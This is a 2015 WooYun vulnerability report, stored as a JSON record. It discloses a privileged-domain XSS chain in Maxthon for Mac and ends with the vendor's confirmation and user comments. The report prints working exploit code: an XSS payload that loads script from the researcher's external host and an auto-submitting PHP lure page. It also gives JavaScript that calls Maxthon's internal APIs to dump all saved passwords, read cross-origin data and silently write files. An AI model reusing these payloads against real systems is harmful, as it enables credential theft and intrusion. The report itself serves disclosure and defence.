{"id": 80549, "wybug_id": "wooyun-2015-0155672", "wybug_title": "Maxthon for mac 获取保存的密码/跨域信息读取/任意文件写入", "wybug_corp": "傲游", "wybug_author": "phith0n", "wybug_date": "2015-11-25 09:56", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 又掉普通了，打卡一次。Mac下的傲游（Maxthon）其实是一个safari内核的浏览器，不过似乎阉割了太多功能，留下来的功能不多。 详细说明：  Mac下的傲游（Maxthon）其实是一个safari内核的浏览器，不过似乎阉割了太多功能，留下来的功能不多。### 特权域XSS首先XSS是由『智能填表』引入的。如下POC，用户提交并点击保存为密码以后，即触发xss。\n<!DOCTYPE html><html><head>    <title><img src=1 onerror=alert(1);></title></head><body><h2>Login</h2><form method=\"post\">    <input type=\"text\" name=\"username\" />    <input type=\"password\" name=\"password\" />    <input type=\"submit\" value=\"submit\" /></form></body></html>\n\n\n\n\n这个XSS在特权域maxthon://settings/下，所以拥有很多特权，这个后面说。### 构造Exploit首先要构造一个可以引入外部js文件的Xss Payload。经过测试发现，有如下几个问题：1.我们使用的payload中不能包含\"、'、\\等字符，这些字符会被转换成url编码。所以我将外部js地址放在html属性name中，然后用this.name来获取.2.经测试不能直接插入script标签。所以我在自带的js文件中找到一个$.ajax方法，此方法可以加载jsonp，正好用来载入外部js最后构造payload如下：\n<img src=1 name=http://mhz.pw/game/maxthon/maxthon.js onerror=$.ajax({dataType:/jsonp/.source,url:this.name})>\n另外，这个XSS需要在设置页面下触发，所以需要自动化提转到设置页面。可以用如下代码跳转到maxthon://域下：\ntry {   location.href=\"maxthon://settings/\";} catch(e) {   alert(e);}\n跳转过去以后即可触发XSS。所以最终完整Exploit见 http://mhz.pw/game/maxthon/log.php\n<!DOCTYPE html><html><head>    <title><img src=1 name=http://mhz.pw/game/maxthon/maxthon.js onerror=$.ajax({dataType:/jsonp/.source,url:this.name})></title><?php     $a = ($_SERVER[\"REQUEST_METHOD\"] == \"POST\");    if($a):?>    <script type=\"text/javascript\">    try {        setTimeout(function(){            location.href=\"maxthon://settings/\";        }, 3000);    } catch(e) {        alert(e);    }        </script><?php     endif;?></head><body <?php if(!$a) { ?>onload=\"f.submit()\"<?php } ?>><h2>Login</h2><form id=\"f\" method=\"post\">    <input type=\"text\" name=\"username\" value=\"aaaaaa\" />    <input type=\"password\" name=\"password\" value=\"admin\" />    <input type=\"submit\" value=\"submit\" /></form></body></html>\n表单自动提交。用户点击『保存』以后，过一会就会跳转到maxthon://setting/并触发特权域XSS。总过程用户只用点击一次。### 特权域API有了特权域的XSS，就可以特权域特权域API来做一些事了。http://mhz.pw/game/maxthon/maxthon.js中写入如下代码即可。##### 后台打开URL：\nmaxthon.send('OpenURL', ['http://**.**.**.**/', false]);//下面这个会让浏览器崩maxthon.send('LoadURL', ['http://**.**.**.**/', false]);\n##### 跨域读取信息：\n// url组装function parseData(url, data) {   var ret = '';   if (typeof data === 'object') {       for(var key in data) {           ret += '&' + key + '=' + encodeURIComponent(data[key]);       }       ret = ret.substr(1);   } else if (typeof data === 'string') {       ret = data;   }   return url + (url.indexOf('?') === -1 ? '?': '&') + ret;}    function sendGet(arg) {   var url = arg.url, data = arg.data, success = arg.success, error = arg.error;   var timer, mark = true, xht = new XMLHttpRequest();   url = parseData(url, data);   // 15秒内无响应返回错误   timer = setTimeout(function () {       mark = false;       error && error(data);   }, 15000);   xht.onreadystatechange = function (){       clearTimeout(timer);       mark && xht.readyState == 4 && xht.status == 200 && success(xht.responseText);   }   xht.open('GET', url, true);   xht.send(null);}sendGet({\tdataType: '123', \turl: \"http://**.**.**.**/\",\tsuccess: function(content) {\t\talert(content);\t}});\n\n\n##### 获取所有保存的密码\nvar module = register('magic-fill');var info = \"\";module.send('MFGetAllInfo', function(data){    for(var i in data) {        info += ('url: ' + data[i].signon + ' username: ' + data[i].username + ' password: ' + data[i].password + '\\n');    }    alert(info);});\n\n\n##### 获取/设置下载目录 + 任意文件写入\n//获取下载目录var module = register('basis');function download_path(downloadPath) {  alert(downloadPath)}module.send('get', 'download_path', download_path);//设置下载目录var module = register('basis');module.send('set', 'download_path', '/Users/phithon/Downloads');//静默下载文件，导致任意文件写入maxthon.send('OpenURL', ['http://mhz.pw/game/maxthon/top3000.zip', false]);\n\n\n\n\n   漏洞证明：  见上。   修复方案：  过滤XSS。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-29 11:23 厂商回复： 确认 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-25 10:07 |    \t\t紫霞仙子  \t\t\t( 普通白帽子  |\t\t\t        Rank:2243 漏洞数:303        | 天天向上 ！！！)\t\t \n  打卡    \n     2015-11-25 12:25 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  打卡    \n     2015-11-25 13:54 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1311 漏洞数:234        | Web安全测试培训  QQ269787775)\t\t \n  打卡打卡    \n     2015-11-26 11:46 |    \t\t王松_Striker \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        | 专注于代码审计,但毛都不会。安全盒子（w...)\t\t \n  前排打卡    \n     2015-11-26 13:54 |    \t\txd-a8 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        )\t\t \n  看学长如何打遨游    \n     2015-12-04 01:24 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB！    \n     2015-12-11 10:56 |    \t\tWinck \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 华人安全网 www.systemsec.cn 719811394)\t\t \n  华人安全网 www.systemsec.cn  前来打卡    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}